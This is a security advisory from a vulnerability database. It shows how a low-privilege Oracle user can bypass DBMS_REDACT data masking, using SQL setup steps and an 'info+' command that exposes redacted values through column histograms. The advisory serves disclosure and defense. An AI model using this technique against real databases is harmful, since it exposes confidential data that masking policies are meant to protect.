---
title: Oracle DBMS_REDACT Dynamic Data Masking Bypass
url: https://cxsecurity.com/issue/WLB-2023010003
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-04
fetch_date: 2025-10-04T02:58:35.111247
---

# Oracle DBMS_REDACT Dynamic Data Masking Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Oracle DBMS\_REDACT Dynamic Data Masking Bypass** **2023.01.03**  Credit:  **[Emad Al-Mousa](https://cxsecurity.com/author/Emad%2BAl-Mousa/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

Title: ByPassing DBMS\_REDACT Dynamic Data Masking security feature in Oracle database system
Product: Database
Manufacturer: Oracle
Affected Version(s): 19c,21c
Tested Version(s): 19c,21c
CVE Reference: N/A
Author of Advisory: Emad Al-Mousa
Overview:
DBMS\_REDACT package provides an interface to Oracle Data Redaction, which enables you to mask (redact) data that is returned from SQL queries. Basically, its dynamic data masking. security policies are configured and enabled through dbms\_redact package.
This is a security feature but doesn't provide a bullet proof data protection, as I will simulate how easily it can be bypassed and masked datacan be extracted/viewed.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Proof of Concept (PoC):
In the database I will create a table called HR.TABLE2 and will create an index on SALES column and insert dummy tables.
SQL> CREATE TABLE HR.TABLE2( COMPANY\_NAME VARCHAR2(10 BYTE), REGION VARCHAR2(10 BYTE), SALES NUMBER(12), DIVISION\_NAME VARCHAR2(12));
SQL> CREATE INDEX HR.IDX\_TABLE2\_SALES ON HR.TABLE2(SALES);
SQL> Insert into HR.TABLE2 values ('COMPANY\_A','EU',120000000,'INDUSTRIAL');
SQL> Insert into HR.TABLE2 values ('COMPANY\_B','ASIA',170000000,'RETAIL');
SQL> Insert into HR.TABLE2 values ('COMPANY\_C','ME',40000000,'SHIPMENT');
SQL> Insert into HR.TABLE2 values ('COMPANY\_D','AFRICA',11000000,'FARMING');
SQL> Insert into HR.TABLE2 values ('COMPANY\_E','LATIN-AM',114000000,'SHIPMENT');
SQL> Insert into HR.TABLE2 values ('COMPANY\_F','NORTH-AM',190000000,'RETAIL');
SQL> commit;
I will create a redaction policy as SYS user against “SALES” column in the table HR.TABLE2:
sqlplus / as sysdba
SQL> begin dbms\_redact.add\_policy( object\_schema => 'HR', object\_name => 'TABLE2', column\_name => 'SALES', policy\_name => 'REDACT\_HR\_SALES', function\_type => DBMS\_REDACT.FULL, expression => '1=1'); end;/
I will create a user called "roro" in the pluggable database ORCLPDB1 with “create session” and "SELECT" permission ONLY on the table:
sqlplus / as sysdba
SQL> alter session set container=ORCLPDB1;SQL> create user roro identified by dummy\_123;SQL> grant select on HR.TABLE2 to roro;
connecting using account roro to the database using "SQL Developer Tool" or SQLCL and execute the following command:
info+ HR.TABLE2;
The histogram data for SALES column will show the actual vaules stored in the redacted column.
Conclusion: So the security feature was bypassed with no excessive privileges required to be granted to the database account, I utilized the info+ command only.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
References:
https://docs.oracle.com/database/121/ASOAG/introduction-to-oracle-data-redaction.htm#ASOAG852
https://databasesecurityninja.wordpress.com/2023/01/03/bypassing-dbms\_redact-dynamic-data-masking-security-feature-in-oracle-database-system/
Thanks,Emad

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023010003)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top